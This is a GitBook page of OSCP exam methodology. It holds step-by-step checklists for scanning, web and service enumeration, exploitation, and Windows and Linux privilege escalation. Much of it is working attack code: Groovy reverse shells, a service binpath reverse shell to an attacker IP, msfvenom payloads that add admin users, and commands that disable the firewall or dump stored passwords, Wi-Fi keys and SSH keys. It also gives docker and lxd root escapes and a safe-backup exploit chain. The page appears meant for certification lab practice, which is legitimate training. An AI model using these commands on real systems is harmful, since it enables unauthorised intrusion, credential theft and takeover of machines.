---
description: Step by step, brick by brick.
cover: ../.gitbook/assets/TryHackMe_OSCP.webp
coverY: 0
---

# 🧱 Step-By-Step Methodology

Goals: This document is intended to spread knowledge to anyone pursuing their OSCP Certification. It contains notes from past experiences and an abundance of commands/methods I have had to utilize to gain access to a targeted machine. Credit is given where it is due.

## Plan of Attack:

* 6 Machines — 70 Points is passing. We’re still shooting for 100 points.
* 3 (AD Set) — Critical — 40 Points (no partial credit)
* 3 Standalone — Must achieve low-priv on one box and full compromise on another.
  1.  Recon — Scan the entire environment.

      1. Establish IP-range/scope

      ```python
      # Nmap
      nmap -sV -sC -p- -v 192.168.1.0/24
      nmap -sn 192.168.1.0/24 
      nmap -sC -sV -O -p- -oA nmap/complete 192.168.1.0/24

      # Nmap UDP
      nmap -sU -O -p- -oA nmap/Complete_UDP 192.168.1.0/24

      # NmapAutomator 
      NmapAutomator.sh -H 192.168.1.0/24 -t network -s ./nmap
      ```

      * What IP’s are we attacking — Place them in notes.
  2. Identify and attack the AD Set first.
  3. Move onto the 3 standalone next.
     1. Chance of a Buffer Overflow being a low-privileged attack vector
  4. Create a “working page” within your notes to store screenshots, proofs, exploits, and more for your exam report.
  5. Take a break after ever flag/major step.

## Tools

{% embed url="https://book.hacktricks.xyz/welcome/readme" %}
For anything I may have missed, this is the place to go
{% endembed %}

{% embed url="https://github.com/hatRiot/clusterd" %}
I think this could help speed up our web server enumeration/fingerprinting
{% endembed %}

{% embed url="https://github.com/mgeeky/tomcatWarDeployer" %}
For usage when attempting to deploy a "War file" reverse shell to a Tomcat target
{% endembed %}

## Submitting Proofs/Screenshots

Linux:

```
#Is the flag in a non-standard directory?
grep -R proof.txt .
grep -R proof.txt /2>/dev/null

hostname && whoami && cat proof.txt && ip a
```

Windows:

```
hostname && whoami.exe && type proof.txt && ipconfig /all
```

## Enumeration

#### Network Enumeration:

<mark style="color:red;">**Disclaimer**</mark>: I choose to utilize a recon enumeration script called NmapAutomator. This is a lightning-fast tool that speeds up my enumeration/recon stage. However, I think it is incredibly important for everyone to understand how Nmap works as well as the syntax and arguments that can be used with it.

NmapAutomator: [https://github.com/21y4d/nmapAutomator](https://github.com/21y4d/nmapAutomator)

#### First scan -- Obtaining a "lay of the land":

```
nmapAutomator.sh -H 192.168.x.x -t network -s ./nmap
```

#### Standalone Scan (TCP, UDP, all 65,535 ports):

```
nmapAutomator.sh -H 192.168.x.x -t All
```

### Service Enumeration:

* [ ] Run nmapAutomator
* [ ] Record every possible vulnerable service
* [ ] Begin version checking:
  * [ ] Banner grabbing with netcat
  * [ ] HackTricks -- [https://book.hacktricks.xyz/welcome/readme](https://book.hacktricks.xyz/welcome/readme)
* [ ] Searchsploit
  * [ ] Search entire version -- `searchsploit redis 5.0.9`
  * [ ] Search broadly (sometimes Searchsploit acts weird) -- `searchsploit redis`&#x20;
* [ ] Ask yourself, what does this service do?
  * [ ] Can we read/write to it?
  * [ ] Can we decrypt it if need be?
  * [ ] How can we exploit this service?
  * [ ] What have we done in the past?
* [ ] Check the services for default credentials
* [ ] Attempt null or Anonymous authentication
* [ ] Bruteforce the service with Hydra
* [ ] Check vulnerability on the Internet
  * [ ] Google site:github.com service version.release
  * [ ] ExploitDB: [https://www.exploit-db.com/](https://www.exploit-db.com/)
  * [ ] CVE Details: [https://www.cvedetails.com/](https://www.cvedetails.com/)
  * [ ] NIST: [https://nvd.nist.gov/](https://nvd.nist.gov/)
* [ ] Google -> Github -> Service+Version+"Exploit"
  * [ ] Every error message
  * [ ] Every PATH
  * [ ] Every string obtained from netcat banner grab

#### Kerberos

#### User Enumeration via Kerbrute:

```
kerbrute userenum --dc 10.10.10.172 -d MEGABANK.LOCAL userlist2
```

#### Validating Users and stealing TGT's if they do not have Pre-Authentication:

```
kerbrute -domain intelligence.htb -users userlist
```

### Web Enumeration

_<mark style="color:green;">"Always keep a form of recon going in the background" \~ Ippsec</mark>_

Checklist:

* [ ] nmapAutomator.sh
* [ ] Use Wappalyzer to determine the application
  * [ ] Node.js
  * [ ] IIS
  * [ ] werkzeug
  * [ ] Apache
  * [ ] etc.
* [ ] Nikto Scan -- `nikto -h <url>`
* [ ] HTTPS
  * [ ] Check certificates for subdomains or other useful information
  * [ ] sslscan -- `sslscan <host:port>`
  * [ ] nmap <mark style="color:red;">heartbleed</mark> vulnerability
* [ ] Visual Inspection -> Navigate to site
  * [ ] Inspect Source Code
    * [ ] Check for APIs
    * [ ] Check comments
    * [ ] Unexpected code
    * [ ] Passwords/usernames
    * [ ] Download tools and inspect with Exiftool
* [ ] Enumerate version of CMS, about page, versions
  * [ ] Searchsploit
  * [ ] Find service and version -- This will require methodical digging
  * [ ] Look for misconfigurations
  * [ ] run nmap with `-sV` and execute an ncat banner grab
  * [ ] Google every error message
  * [ ] Every URL path
  * [ ] Searchsploit every service
  * [ ] Google
    * [ ] Version exploit via ExploitDB
    * [ ] Every version vulnerability
    * [ ] Wordpress
      * [ ] wpscan
      * [ ] Check plugins for vulnerabilities
    * [ ] wpscan brute

#### Drupal

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/drupal" %}

* [ ] Droopescan
* [ ] Check changelog.txt for version information
* [ ] find endpoint\_path
* [ ] Attack Vectors
  * [ ] Drupalgeddon2
  * [ ] Drupalgeddon3
  * [ ] Drupal 7.x Module Services RCE

#### Jenkins

{% embed url="https://book.hacktricks.xyz/cloud-security/jenkins" %}

* [ ] Default Credentials
  * [ ] Create new user
* [ ] Identify version and exploits targetting that version
* [ ] Groovy Reverse Shell:

Windows:

```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

Linux:&#x20;

```
String host="localhost";
int port=8044;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

* [ ] Create new job
* [ ] Can we use curl or cronjob to execute commands?

#### Tomcat

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat" %}

* [ ] Nikto Scan -- `nikto -h <url>`
* [ ] Search vulnerabilities via version number
  * [ ] Look for /manager
  * [ ] User default credential list
    * [ ] Upload war file to get reverse shell
      * [ ] [https://github.com/mgeeky/tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer)

#### WebDav

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/put-method-webdav" %}

* [ ] Default Creds
* [ ] Spray
* [ ] Other Creds
  * [ ] Use cadaver for upload
    * [ ] ASPX

#### phpMyAdmin

* [ ] Attempt Default Credentials
  * [ ] root:
  * [ ] root:password
    * [ ] Once in, we can upload a shell using a SQL query

#### Upload Enumeration

* Where are some places on the target where we could potentially upload a file?
  * Extensions
  * FTP, REDIS, Rsync, etc.

#### If none of the above works:

* It is time to get our hands dirty, this is more than likely a creator-based box and the way to get in is vulnerability-based and requires SQLi, XSS, Code Injection, etc.&#x20;
* Be sure that you use PayloadsAllTheThings and match the technology being used!

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings" %}

#### 401 or 403 Errors?

* [ ] [https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses)

### Web Bruteforce Enumeration

#### IIS Applications:

```
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/IIS.fuzz.txt http://10.10.10.103:80/FUZZ
```

#### Dirsearch:

```
dirsearch -u http://<IP_HERE>
```

#### Gobuster:

Directory-based Enumeration:

```
gobuster dir --url http://example.com --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

DNS-based Enumeration:

```
gobuster dns -d mysite.com -t 50 -w common-names.txt
```

Vhost:

```
gobuster vhost -u https://mysite.com -w common-vhosts.txt
```

#### FFUF VHOST Discovery:

```
ffuf -c -ac -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: Fuzz.forget.htb' -u http://forge.htb
```

## Exploitation

There are three main methods of exploitation:

1. Vulnerable service; Exploit chaining may have to be done
2. Password Spraying; Password reuse & default credentials
3. Bruteforcing

#### Vulnerable Services

Is there any known vulnerability?

* Google site:github.com service version.release
* ExploitDB: [https://www.exploit-db.com/](https://www.exploit-db.com/)
* CVE Details: [https://www.cvedetails.com/](https://www.cvedetails.com/)
* NIST: [https://nvd.nist.gov/](https://nvd.nist.gov/)

No version? We may have to spray and pray

* [ ] Find RCE exploits and run them all

Do we have code execution?

* This step is crucial. To move on, we NEED a reverse shell.
* Use Netcat, python, etc.
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* Use open ports for the reverse shell due to firewall rules

#### Did we obtain credentials?

* Use them against all possible services even on other machines
* SSH, MYSQL, MariaDB, SMB, etc.
* Enumerate all databases
* Place all users in a users.txt file
* Place all passwords in a passwords.txt file
* Utilize users.txt+passwords.txt -> CrackMapExec

## Privilege Escalation - Windows

{% embed url="https://lolbas-project.github.io" %}
Vulnerable binaries, scripts, and libraries; similar to GTFO bins.
{% endembed %}

{% embed url="https://github.com/The-Lynx-Team/OSCP/blob/main/Box%20template/privesc_methodology%F0%9F%AA%82.md" %}
Reference Methodology
{% endembed %}

#### User Enumeration

Users Enumeration:

```
whoami /all
net users %username%
net users
Get-WmiObject -Class Win32\_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

Groups Enumeration:

```
net localgroup
net localgroup Administrators
```

Be vigilant -- see if the current user has the following tokens:

```
 SeImpersonatePrivilege
 SeAssignPrimaryPrivilege
 SeTcbPrivilege
 SeBackupPrivilege
 SeRestorePrivilege
 SeCreateTokenPrivilege
 SeLoadDriverPrivilege
 SeTakeOwnershipPrivilege
 SeDebugPrivilege
```

#### System Enumeration

Windows Version:

```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

View Installed Patches and Updates:

```
wmic qfe
```

View Architecture:

```
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```

Environment Variables

```
set
Get-ChildItem Env: | ft Key,Value
```

Check all Drives

```
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\\FileSystem"}| ft Name,Root
```

#### Network Enumeration

List all NICs, IP's and DNS:

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

Routing Table:

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

ARP Table:

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```

List Current Connections:

```
netstat -ano
```

List current connections correlated to running service (requires elevated privs):

```
netstat -bona
```

Firewall State and Configuration:

```
netsh advfirewall firewall dump
netsh firewall show state
netsh firewall show config
```

List the Firewall's Blocked Ports:

```
$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules |  where {$_.action -eq "0"} | select name,applicationname,localports
```

Disable Firewall:

```
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
```

List Network Shares:

```
net share
powershell Find-DomainShare -ComputerDomain domain.local
```

SNMP Configuration:

```
reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s
Get-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse
```

#### Credential-Based Access

Finding credentials from configuration files:

```
dir /s /b /p *pass* == *cred* == *vnc* == *.config* == *conf* == *ini*
findstr /si /m password *.xml *.ini *.txt
```

Credentials contained in the Registry:

```
 reg query HKLM /f pass /t REG_SZ /s
 reg query HKCU /f pass /t REG_SZ /s
 
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 
 # Windows Autologin
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
  
  # SNMP parameters
 reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
 
 # Putty credentials
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
 reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
 
 # VNC credentials
 reg query "HKCU\Software\ORL\WinVNC3\Password"
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4" /v password
 
 ## OpenSSH credentials
 reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
```

Unattend/Sysprep Files:

```
 c:\sysprep.inf
 c:\sysprep\sysprep.xml
 %WINDIR%\Panther\Unattend\Unattend*.xml
 %WINDIR%\Panther\Unattend*.xml
```

Credentials from Log Files:

```
 dir /s /b /p *access*.log* == *.log
```

Credentials from IIS Web Configuration:

```
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 	
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
 C:\inetpub\wwwroot\web.config
```

Wireless Credentials:

```
 # 1. Find AP SSID
 netsh wlan show profile
 # 2. Get cleartext password
 netsh wlan show profile <SSID> key=clear
 # OR
 # Go hard and grab 'em all
 cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```

Credentials stored in services (SessionGopher.ps1):

{% embed url="https://github.com/Arvanaghi/SessionGopher" %}

```
 # SessionGopher to grab PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP
 # https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
 Import-Module path\to\SessionGopher.ps1;
 Invoke-SessionGopher -AllDomain -o
 Invoke-SessionGopher -AllDomain -u domain.com\adm\-arvanaghi -p s3cr3tP@ss
```

Creds from Powershell History:

```
 type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 cat (Get-PSReadlineOption).HistorySavePath
 cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

* [ ] Check the recycle bin
* [ ] Saved RDP Connections

```
 HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\
 HKCU\Software\Microsoft\Terminal Server Client\Servers\
```

#### Exploit

* [ ] Services running on localhost
* [ ] Kernel Version

```
 # List of exploits kernel https://github.com/SecWiki/windows-kernel-exploits
 # to cross compile a program from Kali
 $ i586-mingw32msvc-gcc -o adduser.exe useradd.c
```

* [ ] Software Versions
* [ ] Service Versions

#### Misconfiguration-Based Access

*   Services

    * [ ] Check permissions



    ```
     # using sc
     sc qc <service_name>

     # using accesschk.exe
     accesschk.exe -ucqv <Service_Name>
     accesschk.exe -uwcqv "Authenticated Users" * /accepteula
     accesschk.exe -uwcqv %USERNAME% * /accepteula
     accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
     accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
     
     # using msf
     exploit/windows/local/service_permissions
    ```

    * [ ] Unquoted Service Path



    ```
     wmic service get name,displayname,pathname,startmode |findstr /i "Auto" | findstr /i /v "C:\Windows\" |findstr /i /v ""
     wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32\" |findstr /i /v "" #Not only auto services

     for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
     	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
     		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
     	)
     )
     
     gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '*'} | select PathName,DisplayName,Name
     
     # find them using msf 
     exploit/windows/local/trusted_service_path
     
     # generate service binary with msfvenom
     msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
    ```

    * [ ] Change service binary path



    ```
     # if the group "Authenticated users" has SERVICE_ALL_ACCESS
     # it can modify the binary path
     
     # bind shell
     sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
     
     # reverse shell
     sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe <attacker-ip> 4444 -e cmd.exe"
     
     # add user to local admin group
     sc config <Service_Name> binpath= "net localgroup administrators username /add"
     
     # example using SSDPRV
     sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
     
     # then restart the service
     wmic service NAMEOFSERVICE call startservice
     net stop [service name] && net start [service name]
    ```

    * [ ] DLL Hijacking / Overwrite service binary



    ```
     for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

     for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
     
     # do it by using sc
     sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
     FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
     FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
    ```

    * [ ] Registry modify permissions

```
 reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

 #Try to write every service with its current content (to check if you have write permissions)
 for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"

 # if Authenticated Users or NT AUTHORITY\INTERACTIVE have FullControl
 # it can be leveraged to change the binary path inside the registry
 reg add HKLM\SYSTEM\CurrentControlSet\srevices\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

*   Installed applications

    * [ ] DLL Hijacking for installed applications



    ```
     dir /a "C:\Program Files"
     dir /a "C:\Program Files (x86)"
     reg query HKEY_LOCAL_MACHINE\SOFTWARE

     Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
     Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
    ```

    * [ ] Write permissions



    ```
     # using accesschk.exe
     accesschk.exe /accepteula
     
     # Find all weak folder permissions per drive.
     accesschk.exe -uwdqs Users c:\
     accesschk.exe -uwdqs "Authenticated Users" c:\
     accesschk.exe -uwdqs "Everyone" c:\
     
     # Find all weak file permissions per drive.
     accesschk.exe -uwqs Users c:\*.*
     accesschk.exe -uwqs "Authenticated Users" c:\*.*
     accesschk.exe -uwdqs "Everyone" c:\*.*
     
     # using icalcs
     icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
     icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
     
     # using Powershell
     Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 

     Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
    ```
* PATH DLL Hijacking

```
 # having write permissions inside a folder present ON PATH could bring to DLL hijacking
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

* AlwaysInstallElevated set in Registry

```
 # if both are enabled (set to 0x1), it's possible to execute
 # any .msi as NT AUTHORITY\SYSTEM
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 
 # check with msf
 exploit/windows/local/always_install_elevated
 
 # generate payload with msfvenom
 # no uac format
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi
 # using the msiexec the uac wont be prompted
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi
 
 # install .msi
 msiexec /quiet /qn /i C:\Users\Homer.NUCLEAR\Downloads\donuts.msi
```

* Scheduled tasks

```
 # using schtasks
 schtasks /query /fo LIST /v
 # filtering the output
 schtasks /query /fo LIST /v | findstr /v "\Microsoft"
 
 # using powershell
 Get-ScheduledTask | ft TaskName,TaskPath,State
 # filtering the output
 Get-ScheduledTask | where {$_.TaskPath -nolike "\Microsoft*"} | ft TaskName,TaskPath,State
```

* [ ] Executable file writeable
* [ ] Dependency writeable

<!---->

* Sensitive files readable
  * [ ] SAM Hive
  * [ ] SYSTEM Hive
* Windows Subsystem For Linux

```
 wsl whoami
 ./ubuntum2004.exe config --default-user root
 wsl whoami
 wsl python -c 'put here your command'
```

## Privilege Escalation - Linux

{% embed url="https://gtfobins.github.io/" %}
Vulnerable binaries that can be used to bypass local restrictions -- PRIV ESC!
{% endembed %}

#### User Enumeration

Users Enumeration:

```
 whoami
 id
 cat /etc/passwd | cut -d: -f1
```

Group Enumeration:

```
 groups username
 cat /etc/groups
```

Check for Super Users:

```
 grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' \
 awk -F: '($3 == "0") {print}' /etc/passwd \
 cat /etc/sudoers
```

What are the current user's sudo privileges:

```
sudo -l
```

Groups:

```
 id
 groups
```

Who is currently logged in?

```
 # show who is logged on
 who
 # show who is logged on and what he/she's doing
 w
```

Last Logged in User?

```
last
```

#### System Enumeration

Kernel Version & Architecture:

```
 uname -a
 (cat /proc/version || uname -a ) 2>/dev/null
 lsb_release -a 2>/dev/null
 lscpu
```

Distribution:

```
 cat /etc/issue
```

Sudo Version:

```
sudo -V
```

Services Running:

```
 ps aux
 ps aux | grep root
```

Look for Useful Software & Compiler:

```
 # if there is a compiler check if it's vulnerable to kernel exploit
 which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp tmux screen nmap 2>/dev/null
```

#### Network Enumeration

Retrieve Hostname:

```
 hostname
 cat /etc/hostname
```

Network Configuration:

```
 route
 ip -c route
```

ARP Table:

```
 arp -a
 ip -c neigh
```

Check Internal Ports:

```
 netstat -ano
```

#### Credential-Based Access

* [ ] Try known passwords
* [ ] Search creds from config files

```
 grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
 find . -type f -exec grep -i -I "PASSWORD" {} /dev/null
 locate password | more
```

* [ ] Search credentials in common files:

```
 ls -la /var /var/mail /var/spool/mail
```

* [ ] Search credentials from local DB's
* [ ] Search credentials from bash history

```
 history
 cat ~/.bash_history
```

* [ ] Search credentials from memory

```
 strings /dev/mem -n10 | grep -i PASS
```

* [ ] Search for SSH Keys

```
 cat ~/.ssh/id_rsa
 ls ~/.ssh/*
 find / -name authorized_keys 2> /dev/null
 find / -name id_rsa 2> /dev/null
```

* [ ] Search Rsync configuration file

```
 find /etc \( -name rsyncd.conf -o -name rsyncd.secrets \)
```

#### Exploit-Based Access

* [ ] Is the kernel vulnerable to a known exploit?
* [ ] Is Sudo vulnerable to a known exploit?
* [ ] Are their services running on localhost that are vulnerable?

#### Misconfiguration-Based Access:

* [ ] Cron Job -> Check for write permissions in the following files:

```
 /etc/init.d
 /etc/cron*
 /etc/crontab
 /etc/cron.allow
 /etc/cron.d 
 /etc/cron.deny
 /etc/cron.daily
 /etc/cron.hourly
 /etc/cron.monthly
 /etc/cron.weekly
 /etc/sudoers
 /etc/exports
 /etc/anacrontab
 /var/spool/cron
 /var/spool/cron/crontabs/root
 crontab -l
 ls -alh /var/spool/cron;
 ls -al /etc/ | grep cron
 ls -al /etc/cron*
 cat /etc/cron*
 cat /etc/at.allow
 cat /etc/at.deny
 cat /etc/cron.allow
 cat /etc/cron.deny*
```

* [ ] Find SUID:

{% embed url="https://gtfobins.github.io" %}

```
 find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
 find / -uid 0 -perm -4000 -type f 2>/dev/null
```

* [ ] Find SGID:

```
 find / -perm -g=s -type f 2>/dev/null
 find / -perm +2000 -user root -type f -print
```

* [ ] Interesting Capabilities on Binary:

```
 getcap -r / 2>/dev/null
```

* [ ] Any writable file

```
 # look for any writable file
 find / -type f -writable 2> /dev/null

 # look for writable configuration file
 find /etc -type f -writable 2> /dev/null
```

* [ ] Any user owned file

```
 find / -type f -user username 2>/dev/null
```

* [ ] Any NFS share

```
 # check if it's avaiable a NFS share
 showmount -e X.X.X.X;
 # mount it and look for files or try to create ones
 # maybe you are another user
 mount X.X.X.X:/ /tmp/
```

* [ ] Let [Pspy](https://github.com/DominicBreuker/pspy) spy on the processes:

```
 # you could find some interesting running processes or credentials
 ./pspy > /tmp/pspy-out.txt
```

* [ ] Is .bashrc writeable?

```
 # if another user's .bashrc is writeable, you could
 # put code inside it and wait the user to login in order
 # to trigger the execution of it
 ls -la /home/*/.bashrc; find / -name .bashrc -xdev 2>/dev/nul
```

* [ ] Is the user beloging to docker?

```
 # this will spawn a root shell
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

* [ ] Is the user beloging to lxd?

```
 # clone the repo and build an alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
 cd lxd-alpine-builder
 sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
 sudo ./build-alpine -a i686

 # transfer the image to the target, then import the image
 lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

 # before running the image, start and configure the lxd storage pool as default 
 lxd init

 # run the image
 lxc init myimage mycontainer -c security.privileged=true

 # mount the /root into the image
 lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

 # pop the shell
 lxc start mycontainer
 lxc exec mycontainer /bin/sh
```

* [ ] Ability to use [safe-backup](https://github.com/scrwdrv/safe-backup) as another user (root)?

```
 # you can install safe-backup on your system, now you can
 # potentially backup whatever you want e.g.: your root public ssh key!

 ## Preparation
 ### ON ATTACKING MACHINE
 sudo safe-backup -i /root/.ssh/ -o /tmp/backup
 # copy the safe-backup's encryption key to the /tmp/backup directory
 sudo cp /root/.config/safe-backup/key.safe /tmp/backup/key.safe
 # transfer them to the target machine

 ## Getting ready
 ### ON TARGET MACHINE
 # you have to import the newly downloaded encryption key :)
 sudo /usr/bin/safe-backup --import-key /path/where/is/key.safe
 # When decrypting files, safe-backup creates # a new directory
 # with the same name as the backup but without the .bua extension.
 # If this directory already exists, the existing directory is used
 #rather than a new one being created. We can exploit this by
 # creating a symbolic link to /root/.ssh and having safe-backup
 # decrypt folders into this directory.
 ln -s /root/.ssh /path/where/is/-root-.ssh
 
 ## Exploitation
 ### ON TARGET MACHINE
 sudo safe-backup -d /path/where/is/-root-.ssh.bua
 ### ON ATTACKING MACHINE
 sudo ssh -i /root/.ssh/id_rsa root@$IP
```

*   [ ] Any accessible sensitive file?

    * [ ] /etc/passwd
    * [ ] /etc/shadow
    * [ ] /etc/sudoers
    * [ ] Configuration files
    * [ ] /root/.ssh/id\_rsa
    * [ ] entire root folder
    * [ ] Check env info

    ```
     (env || set) 2>/dev/null
     echo $PATH
    ```
* [ ] Writeable PATH
  * [ ] Root $PATH writeable
  * [ ] Directory in PATH writeable
* [ ] LD\_PRELOAD set in /etc/sudoers
* [ ] Nothing yet? Google-Fu the web to look for other checklists

#### Automation

* [ ] LinPEAS
* [ ] LinEnum
* [ ] LES2
* [ ] LinuxPrivChecker
* [ ] Linux Smart Enumeration
